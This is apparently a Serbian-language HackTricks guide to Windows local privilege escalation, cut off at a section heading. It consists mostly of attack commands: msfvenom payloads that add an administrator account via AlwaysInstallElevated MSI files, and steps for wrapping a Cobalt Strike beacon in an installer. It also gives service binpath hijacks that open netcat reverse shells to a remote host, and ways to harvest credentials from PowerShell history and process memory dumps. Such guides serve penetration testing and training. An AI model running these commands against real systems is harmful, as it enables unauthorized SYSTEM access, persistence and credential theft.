# Windows Local Privilege Escalation

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristupiti **najnovijoj verziji PEASS ili preuzeti HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Najbolji alat za traženje vektora za eskalaciju privilegija na Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Početna teorija o Windows-u

### Pristupni tokeni

**Ako ne znate šta su Windows pristupni tokeni, pročitajte sledeću stranicu pre nego što nastavite:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL-ovi - DACL-ovi/SACL-ovi/ACE-ovi

**Proverite sledeću stranicu za više informacija o ACL-ovima - DACL-ovima/SACL-ovima/ACE-ovima:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windows-u, trebalo bi da pročitate sledeću stranicu pre nego što nastavite:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows kontrolne tačke bezbednosti

Postoje različite stvari u Windows-u koje bi mogle **da vas spreče da enumerišete sistem**, pokrenete izvršne datoteke ili čak **detektujete vaše aktivnosti**. Trebalo bi da **pročitate** sledeću **stranicu** i **enumerirate** sve ove **odbrambene mehanizme** pre početka enumeracije eskalacije privilegija:

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li Windows verzija ima poznatu ranjivost (proverite takođe primenjene zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Verzija Eksploatacije

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pretragu detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka ima više od 4.700 bezbednosnih ranjivosti, pokazujući **masivnu površinu napada** koju Windows okruženje predstavlja.

**Na sistemu**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima ugrađen watson)_

**Lokalno sa informacijama o sistemu**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repozitorijumi eksploatacija:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su bilo kakve akreditacije/sočne informacije sačuvane u okružnim promenljivama?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```

### Istorija PowerShell-a

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell zapisnici transkripta

Možete naučiti kako da to uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

### PowerShell Moduliranje Logovanje

Detalji izvršenja PowerShell cevovoda se beleže, obuhvatajući izvršene komande, pozive komandi i delove skripti. Međutim, potpuni detalji izvršenja i rezultati izlaza možda neće biti zabeleženi.

Da biste omogućili ovo, pratite uputstva u odeljku "Transkript fajlova" dokumentacije, birajući **"Moduliranje logovanja"** umesto **"PowerShell transkripcije"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste videli poslednjih 15 događaja iz PowerShell logova, možete izvršiti:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Logovanje blokova skripti**

Zabeležen je kompletan tok aktivnosti i sadržaj izvršenja skripte, osiguravajući da je svaki blok koda dokumentovan dok se izvršava. Ovaj proces čuva sveobuhvatnu evidenciju svake aktivnosti, korisnu za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršenja, pružaju se detaljni uvidi u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaji za blok skripte mogu se pronaći u Windows Event pregledaču na putanji: **Aplikativni i servisni zapisi > Microsoft > Windows > PowerShell > Operativni**.\
Za pregled poslednjih 20 događaja možete koristiti:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet postavke

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Sistem možete kompromitovati ako se ažuriranja ne zahtevaju korišćenjem http**S** već http.

Počinjete proverom da li mreža koristi ne-SSL WSUS ažuriranje pokretanjem sledećeg:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ako dobijete odgovor kao što je:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

I ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` jednako `1`.

Onda, **to je iskorišćivo.** Ako je poslednji registar jednak 0, tada će unos WSUS biti ignorisan.

Da biste iskoristili ove ranjivosti, možete koristiti alate poput: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - Ovo su skripte za eksploataciju oružja za napad usredstvenog čoveka (MiTM) za ubacivanje 'lažnih' ažuriranja u ne-SSL WSUS saobraćaj.

Pročitajte istraživanje ovde:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Pročitajte kompletan izveštaj ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
U osnovi, ovo je propust koji ovaj bag iskorišćava:

> Ako imamo moć da izmenimo naš lokalni korisnički proxy, i Windows ažuriranja koriste proxy konfigurisan u postavkama Internet Explorer-a, stoga imamo moć da pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus) lokalno da presretnemo sopstveni saobraćaj i pokrenemo kod kao privilegovani korisnik na našem resursu.
>
> Nadalje, pošto WSUS servis koristi postavke trenutnog korisnika, takođe će koristiti njegovu bazu sertifikata. Ako generišemo samopotpisani sertifikat za WSUS ime hosta i dodamo ovaj sertifikat u bazu sertifikata trenutnog korisnika, bićemo u mogućnosti da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme poput HSTS-a za implementaciju validacije tipa poverenja pri prvom korišćenju na sertifikatu. Ako sertifikat koji se predstavlja je poveren od strane korisnika i ima ispravno ime hosta, biće prihvaćen od strane servisa.

Možete iskoristiti ovu ranjivost koristeći alat [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude oslobođen).

## KrbRelayUp

Postoji **ranjivost lokalnog eskaliranja privilegija** u Windows **domenskim** okruženjima pod određenim uslovima. Ovi uslovi uključuju okruženja gde **LDAP potpisivanje nije obavezno,** korisnici imaju samoprava koja im omogućava konfigurisanje **Delegacije ograničenja zasnovane na resursima (RBCD),** i mogućnost korisnika da kreiraju računare unutar domena. Važno je napomenuti da se ovi **zahtevi** ispunjavaju korišćenjem **podrazumevanih postavki**.

Pronađite **eksploataciju u** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada proverite [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ako** su ova 2 registra **omogućena** (vrednost je **0x1**), tada korisnici sa bilo kojim privilegijama mogu **instalirati** (izvršiti) `*.msi` fajlove kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloadi

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```

Ako imate meterpreter sesiju, možete automatizovati ovu tehniku koristeći modul **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz PowerUP-a da biste kreirali Windows MSI binarni fajl unutar trenutnog direktorijuma radi eskalacije privilegija. Ovaj skript piše prekompilatorni MSI instalater koji traži dodavanje korisnika/grupe (tako da će vam biti potreban pristup GUI-u):

```
Write-UserAddMSI
```

### Izvršite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Omotač

Pročitajte ovaj tutorijal da biste naučili kako da napravite MSI omotač koristeći ovaj alat. Imajte na umu da možete omotati "**.bat**" fajl ako želite **samo** da **izvršite** **komandne linije**

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Kreirajte MSI sa WIX-om

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Kreirajte MSI sa Visual Studio-om

* **Generišite** sa Cobalt Strike ili Metasploit **novi Windows EXE TCP payload** u `C:\privesc\beacon.exe`
* Otvorite **Visual Studio**, izaberite **Create a new project** i u polje za pretragu unesite "installer". Izaberite projekat **Setup Wizard** i kliknite na **Next**.
* Dajte projektu ime, kao što je **AlwaysPrivesc**, koristite **`C:\privesc`** za lokaciju, izaberite **place solution and project in the same directory**, i kliknite na **Create**.
* Nastavite da klikate na **Next** dok ne dođete do koraka 3 od 4 (izbor fajlova za uključivanje). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
* Istaknite projekat **AlwaysPrivesc** u **Solution Explorer**-u i u **Properties**, promenite **TargetPlatform** sa **x86** na **x64**.
* Postoje i druge osobine koje možete promeniti, kao što su **Author** i **Manufacturer** koji mogu učiniti da instalirana aplikacija izgleda autentičnije.
* Desnim klikom na projekat izaberite **View > Custom Actions**.
* Desnim klikom na **Install** izaberite **Add Custom Action**.
* Dvaput kliknite na **Application Folder**, izaberite vaš fajl **beacon.exe** i kliknite na **OK**. Ovo će osigurati da se beacon payload izvrši čim se pokrene instalater.
* Pod **Custom Action Properties**, promenite **Run64Bit** u **True**.
* Na kraju, **izgradite** to.
* Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste postavili platformu na x64.

### Instalacija MSI-ja

Za izvršavanje **instalacije** zlonamernog `.msi` fajla u **pozadini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always\_install\_elevated_

## Antivirus i Detektori

### Postavke revizije

Ove postavke određuju šta se **loguje**, stoga treba da obratite pažnju

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, je interesantno znati gde se šalju logovi

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je dizajniran za **upravljanje lokalnim administratorskim lozinkama**, osiguravajući da svaka lozinka bude **jedinstvena, nasumična i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se sigurno čuvaju unutar Active Directory-ja i mogu im pristupiti samo korisnici kojima su dodeljene dovoljne dozvole putem ACL-ova, omogućavajući im da vide lokalne administratorske lozinke ako su ovlašćeni.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Ako je aktivan, **lozinke u obliku teksta se čuvaju u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Zaštita LSA

Počevši od **Windows 8.1**, Microsoft je uveo unapređenu zaštitu za Lokalni bezbednosni autoritet (LSA) kako bi **blokirao** pokušaje nepoverenih procesa da **čitaju njegovu memoriju** ili ubacuju kod, dodatno osiguravajući sistem.\
[**Više informacija o zaštiti LSA ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Zaštita podataka za pristupne podatke

**Zaštita pristupnih podataka** je uvedena u **Windows 10**. Njen cilj je da zaštiti pristupne podatke koji se čuvaju na uređaju od pretnji poput napada prenošenjem heša.| [**Više informacija o zaštiti pristupnih podataka ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširane akreditacije

**Kredencijali domena** se autentikuju od strane **Lokalne bezbednosne autorizacije** (LSA) i koriste od strane komponenti operativnog sistema. Kada se korisnički podaci za prijavljivanje autentikuju od strane registrovanog sigurnosnog paketa, obično se uspostavljaju kredencijali domena za korisnika.\
[**Više informacija o keširanim akreditacijama ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i Grupe

### Nabrojavanje Korisnika i Grupa

Treba da proverite da li neka od grupa kojima pripadate ima zanimljiva ovlašćenja

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da eskalirate privilegije**. Saznajte više o privilegovanim grupama i kako ih zloupotrebiti radi eskalacije privilegija ovde:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Manipulacija tokenima

Saznajte više o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o zanimljivim tokenima** i kako ih zloupotrebiti:

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### Prijavljeni korisnici / Sesije

```bash
qwinsta
klist sessions
```

### Matični direktorijumi

```powershell
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinke

```bash
net accounts
```

### Dobijanje sadržaja iz clipboard-a

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za datoteke i fascikle

Prvo, listanje procesa **proverava lozinke unutar komandne linije procesa**.\
Proverite da li možete **prepisati neki pokrenuti binarni fajl** ili imate dozvole za pisanje u fascikli binarnog fajla kako biste iskoristili moguće [**DLL Hijacking napade**](dll-hijacking/):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su pokrenuti mogući **electron/cef/chromium debugeri**, možete ih zloupotrebiti za eskalaciju privilegija.

**Provera dozvola binarnih fajlova procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```

**Provera dozvola foldera binarnih fajlova procesa (**[**DLL Hijacking**](dll-hijacking/)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Rudarenje lozinke iz memorije

Možete kreirati memorijski dump pokrenutog procesa koristeći **procdump** iz sysinternals-a. Servisi poput FTP-a imaju **kredencijale u čistom tekstu u memoriji**, pokušajte da izvršite dump memorije i pročitate kredencijale.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nesigurne GUI aplikacije

**Aplikacije koje se izvršavaju kao SISTEM mogu dozvoliti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: "Windows Help and Support" (Windows + F1), pretraga "command prompt", klik na "Click to open Command Prompt"

## Servisi

Dobijanje liste servisa:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o usluzi

```bash
sc qc <service_name>
```

Preporučljivo je imati binarni **accesschk** iz _Sysinternals_-a kako biste proverili potrebni nivo privilegija za svaku uslugu.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se proveriti da li "Authenticated Users" mogu da menjaju bilo koji servis:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Možete preuzeti accesschk.exe za XP ovde](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako imate ovu grešku (na primer sa SSDPSRV):

_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Možete ga omogućiti korišćenjem

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte u vidu da usluga upnphost zavisi od SSDPSRV da bi radila (za XP SP1)**

**Još jedan način** za rešavanje ovog problema je pokretanje:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarnog fajla servisa**

U scenariju gde grupa "Authenticated users" poseduje **SERVICE\_ALL\_ACCESS** na servisu, moguća je izmena izvršnog binarnog fajla servisa. Za izmenu i izvršavanje **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje servisa

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije mogu biti eskalirane kroz različite dozvole:

* **SERVICE\_CHANGE\_CONFIG**: Omogućava rekonfiguraciju servisnog binarnog fajla.
* **WRITE\_DAC**: Omogućava rekonfiguraciju dozvola, što dovodi do mogućnosti promene konfiguracija servisa.
* **WRITE\_OWNER**: Dozvoljava sticanje vlasništva i rekonfiguraciju dozvola.
* **GENERIC\_WRITE**: Nasleđuje sposobnost promene konfiguracija servisa.
* **GENERIC\_ALL**: Takođe nasleđuje sposobnost promene konfiguracija servisa.

Za detekciju i iskorišćavanje ove ranjivosti, može se koristiti _exploit/windows/local/service\_permissions_.

### Slabe dozvole servisnih binarnih fajlova

**Proverite da li možete izmeniti binarni fajl koji izvršava servis** ili da li imate **dozvole za pisanje u fascikli** gde se binarni fajl nalazi ([**DLL Hijacking**](dll-hijacking/))**.**\
Možete dobiti svaki binarni fajl koji izvršava servis koristeći **wmic** (ne u system32) i proveriti vaše dozvole koristeći **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti **sc** i **icacls**:

```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

### Dozvole za izmenu registra usluga

Treba da proverite da li možete da izmenite bilo koji registar usluga.\
Možete **proveriti** svoje **dozvole** nad registrom usluga tako što ćete:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Potrebno je proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** poseduju dozvole `FullControl`. Ukoliko je to slučaj, binarni fajl koji izvršava servis može biti promenjen.

Za promenu putanje izvršenja binarnog fajla:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Dozvole za dodavanje podataka/dodavanje poddirektorijuma u registru usluga

Ako imate ovu dozvolu nad registrom, to znači da **možete kreirati poddirektorijume iz ovog**. U slučaju Windows usluga, ovo je **dovoljno za izvršavanje proizvoljnog koda:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Putanje usluga bez navođenja u navodnicima

Ako putanja do izvršne datoteke nije unutar navodnika, Windows će pokušati izvršiti svaki završetak pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati izvršiti:

```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

### Lista svih neoznačenih putanja servisa, isključujući one koje pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i iskoristiti** pomoću metasploita: `exploit/windows/local/trusted\_service\_path` Možete ručno kreirati binarnu uslugu pomoću metasploita:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Postupci oporavka

Windows korisnicima omogućava da specificiraju akcije koje će biti preduzete ukoliko servis ne uspe. Ova funkcionalnost može biti konfigurisana da pokazuje ka binarnom fajlu. Ukoliko je ovaj binarni fajl zamenjiv, moguć je _privilege escalation_. Više detalja možete pronaći u [zvaničnoj dokumentaciji](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Aplikacije

### Instalirane Aplikacije

Proverite **dozvole binarnih fajlova** (možda možete prepisati jedan i eskalirati privilegije) i **foldera** ([DLL Hijacking](dll-hijacking/)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

### Dozvole za pisanje

Proverite da li možete da izmenite neku konfiguracionu datoteku kako biste pročitali neku posebnu datoteku ili da izmenite neki izvršni fajl koji će biti pokrenut od strane naloga Administratora (schedtasks).

Način da pronađete slabe dozvole foldera/datoteka u sistemu je:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Pokreni pri pokretanju

